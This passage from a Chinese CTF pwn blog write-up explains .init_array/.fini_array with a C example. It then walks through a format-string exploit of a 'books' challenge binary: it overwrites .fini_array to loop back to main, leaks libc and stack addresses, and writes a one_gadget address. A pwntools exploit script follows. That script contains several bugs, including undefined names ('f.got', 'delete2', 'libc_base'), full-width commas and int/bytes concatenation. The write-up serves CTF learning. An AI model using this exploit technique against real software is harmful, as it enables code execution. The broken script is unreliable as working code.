+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((constructor))</span>;<br><span class="hljs-comment">//constructor意为构造函数声明，所有构造函数都会在main函数之前执行</span><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span> __<span class="hljs-title function_">attribute__</span> <span class="hljs-params">((destructor))</span>;<br><span class="hljs-comment">//destructor意为析构函数，所有析构函数都会在main函数之后运行</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;start == %p\n&quot;</span>, start);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;stop == %p\n&quot;</span>, stop);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;hello world!\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">stop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;goodbye world!\n&quot;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure>
+
+<p>我们执行这个程序，并查看其 .init_array 和 .fini_array 的地址</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fini_array_1.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fini_array_3.png" srcset="/img/loading.gif" lazyload></p>
+<p>我们可以查看 .init_array 和 .fini_array 地址处存储的指针：</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/fini_array_2.png" srcset="/img/loading.gif" lazyload></p>
+<p>.init_array 存的 <code>0x400540</code> 是 frame_dummy 函数地址（可以在 ida 里面查看），<code>0x4005a4</code> 是我自己定义的 start 函数的地址，也就是说 main 函数开始之前会先执行 frame_dummy 函数和 start 函数。</p>
+<p>.fini_array 存的 <code>0x400520</code> 是 do_global_dtors_aux 函数地址，<code>0x4005b5</code> 是自己定义的 stop 函数的地址，也就是说 main 函数结束之后会执行 do_global_dtors_aux 函数和 stop 函数。</p>
+<p>去除我们自己定义的属性，此时 .ini_array 和 .fini_array 都只有一个函数指针，对应的 .ini_array 是 frame_dummy 函数地址，fini_array是 __do_global_dtors_aux 函数地址。</p>
+<blockquote>
+<p>知识点结束！</p>
+</blockquote>
+<hr>
+<p>所以我们可以利用第一次格式化字符串将 <code>.fini_array</code> 地址处的函数修改成 main 函数的地址，使程序重新回到 main 函数。除此之外，我们还需要泄漏 libc 地址，再进行 shellcode 的构造这样就是总共利用三次格式化字符串。</p>
+<p>我们可以直接在 ida 里面看到 <code>.fini_array</code>  的地址是 0x6011B8：</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/books_fini.png" srcset="/img/loading.gif" lazyload></p>
+<p>新的问题来了，怎么把  <code>.fini_array</code>  输入进栈并确定它与 printf 的偏移？同一个函数的栈空间是固定的，我们只需要确定偏移，只需要利用前面的 0x80 的空间，我们可以将 <code>.fini_arry</code> 输入到 s 里然后通过调试确定偏移。</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/printf_padding.png" srcset="/img/loading.gif" lazyload></p>
+<p>断点打在 <code>printf(dest)</code> 处，可以得出我们输入的 s 在栈上的偏移是 12。</p>
+<p>除了 fini 的偏移，我们还需要确定 libc 基址的偏移：</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/books_padding.png" srcset="/img/loading.gif" lazyload></p>
+<p>这个栈地址始终指向比自己低 <code>0x10</code> 字节的栈地址，而且指向的栈地址和返回地址也有固定的 <code>0x28</code> 的偏移，所以我选择用格式化字符串泄漏这个栈地址，但是这里还有一个问题：</p>
+<p>我们在填充格式化字符串漏洞时，也需要考虑 submitt 函数的功能。我们现在覆盖用 <em>v7</em> 覆盖了 <em>dest</em> 部分，所以输出的字符串将是：</p>
+<p><img src="/img/how2heap%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BA%E5%AD%A6%E4%B9%A0%E5%A0%86%E5%88%A9%E7%94%A8-%E4%B8%80/books_dest.png" srcset="/img/loading.gif" lazyload></p>
+<p>由上图可以看出，我们可以控制的部分是 chunk1 的内容，我们想要控制格式化字符串部分在 <em>dest</em> 指针处，可以控制 chunk1 的内容长度，让其第二次被写入 <em>v5</em> 时刚好重叠在 <em>dest</em> 的位置。</p>
+<p>也就是：</p>
+<p>size(<code>Order 1:</code> + <code>chunk1</code> + <code>&#39;\n&#39;</code> + <code>Order 2:</code> + <code>Order 1:</code>) &#x3D; 0x90</p>
+<p>size(<code>chunk1</code>) &#x3D; 0x90 - 28 &#x3D; 0x74</p>
+<p>所以我们构造 <code>chunk1</code> 中的内容的时候只要使其中非 0 字符串的个数达到 <code>0x74</code> 就行了。</p>
+<p>综上！</p>
+<blockquote>
+<p>这道题对我来说好难啊😢对着别人的 wp 磕了两天才嗑明白，格式化字符串的部分还是有些生疏了</p>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span>*<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;amd64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>p=process(<span class="hljs-string">&quot;./books&quot;</span>)<br><span class="hljs-comment">#gdb.attach(p,&quot;b main&quot;)</span><br>elf=ELF(<span class="hljs-string">&quot;./books&quot;</span>)<br>free_got=f.got[<span class="hljs-string">&quot;free&quot;</span>]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">num,msg</span>):<br>    p.sendline(num)<br>    p.sendline(msg)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">delete</span>(<span class="hljs-params">num</span>):<br>    p.sendline(num)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">submit</span>():<br>    p.sendline(<span class="hljs-string">&#x27;5&#x27;</span>)<br><br>fini_addr=<span class="hljs-number">0x6011b8</span><br>start = <span class="hljs-number">0x400780</span><br>one = [<span class="hljs-number">0x45206</span>,<span class="hljs-number">0x4525a</span>,<span class="hljs-number">0xcc673</span>,<span class="hljs-number">0xcc748</span>,<span class="hljs-number">0xefa00</span>,<span class="hljs-number">0xf0897</span>,<span class="hljs-number">0xf5e40</span>,<span class="hljs-number">0xef9f4</span>] <br><br>delete(<span class="hljs-number">2</span>)<br><br>payload = <span class="hljs-string">b&#x27;%&#x27;</span> + <span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(start &amp; <span class="hljs-number">0xffff</span>),<span class="hljs-string">&#x27;utf-8&#x27;</span>) + <span class="hljs-string">b&#x27;c%13$hn&#x27;</span> <span class="hljs-comment">#修改fini的内容</span><br>payload=payload+<span class="hljs-string">b&quot;function:%31$p stack:%33$p&quot;</span>    <span class="hljs-comment"># 泄露栈顶地址和函数地址</span><br>payload=payload+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x74</span>-<span class="hljs-built_in">len</span>(payload))<br>payload=payload+<span class="hljs-string">b&quot;\x00&quot;</span>*(<span class="hljs-number">0x88</span>-<span class="hljs-built_in">len</span>(payload))+p64(<span class="hljs-number">0x151</span>)<br><br>edit(<span class="hljs-number">1</span>，payload)<br>submit(p64(fini_addr))<br><br>p.recvuntil(<span class="hljs-string">b&quot;stack:&quot;</span>)<br>stack_addr=p.recvuntil(<span class="hljs-string">b&quot;a&quot;</span>)[:-<span class="hljs-number">1</span>]<br>stack_addr=<span class="hljs-built_in">int</span>(stack_addr,<span class="hljs-number">16</span>)<br><br>p.recvuntil(<span class="hljs-string">b&quot;function:&quot;</span>)<br>libc_start_main=p.recvuntil(<span class="hljs-string">b&quot; &quot;</span>)[:-<span class="hljs-number">1</span>]<br>libc_start_main=<span class="hljs-built_in">int</span>(libc_start_main,<span class="hljs-number">16</span>) <span class="hljs-comment"># 将0x形式的字符串转化数字</span><br><br>libc_start_main=libc_start_main-<span class="hljs-number">240</span><br><br>libc_addr=libc_start_main-<span class="hljs-number">0x20750</span><br>stack_addr=stack_addr-<span class="hljs-number">0x1b0</span>-<span class="hljs-number">0x110</span> +<span class="hljs-number">208</span><br>onegadget_addr=libc_addr+<span class="hljs-number">0x45226</span><br><br><br>one_gadget = libc_base + one[<span class="hljs-number">0</span>]<br>one1 = u16(p64(one_gadget)[:<span class="hljs-number">2</span>])-<span class="hljs-number">22</span>  <span class="hljs-comment">#最后2字节 +偏移</span><br>one2 = u8(p64(one_gadget)[<span class="hljs-number">2</span>:<span class="hljs-number">3</span>]) -<span class="hljs-number">6</span> <span class="hljs-comment">#最后第3字节+偏移</span><br><br>delete2()<br><span class="hljs-built_in">print</span>(one1)<br><span class="hljs-built_in">print</span>(one2)<br>payload=<span class="hljs-string">b&quot;%&quot;</span>+one1+<span class="hljs-string">b&quot;c%13$hhn&quot;</span>+<span class="hljs-string">b&quot;%&quot;</span>+one2+<span class="hljs-string">b&quot;c%14$hn&quot;</span><br><br>payload=payload+<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x90</span>-<span class="hljs-number">28</span>-<span class="hljs-built_in">len</span>(payload))<br>payload=payload+<span class="hljs-string">b&quot;\x00&quot;</span>*(<span class="hljs-number">0x88</span>-<span class="hljs-built_in">len</span>(payload))+p64(<span class="hljs-number">0x151</span>)<br><span class="hljs-comment"># Order 1: 内容\nOrder 2: Order 1: 内容\nOrder 2: \n</span><br>edit(<span class="hljs-number">1</span>，payload)<br><br>submit(<span class="hljs-string">b&#x27;5&#x27;</span>+<span class="hljs-number">7</span>*p8(<span class="hljs-number">0x0</span>)+p64(stack_addr+<span class="hljs-number">2</span>)+p64(stack_addr))<br><br>p.interactive()<br></code></pre></td></tr></table></figure>
+
+
+
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/pwn/" class="category-chain-item">pwn</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Knowledge/">#Knowledge</a>
+      
+        <a href="/tags/heap/">#heap</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>how2heap深入浅出学习堆利用(一)</div>
+      <div>https://shmodifier.github.io/2024/03/02/how2heap深入浅出学习堆利用-一/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Modifier</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年3月2日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+                <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="SA - 相同方式共享">
+                    <i class="iconfont icon-sa"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/12/31/2024%E5%B9%B4%E7%BB%88%E6%80%BB%E7%BB%93/" title="2023年终总结">
+                        <span class="hidden-mobile">2023年终总结</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    
+    <div class="footer-content">
+       <p> Copyright &copy; 2022&nbsp;-&nbsp;2024 <a href="/">Modifier</a> </p> <p>Powered by <a href="https://hexo.io" target="_blank">Hexo</a> | Theme - <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a></p> <!--  <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> -->
+
+    </div>
+  
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
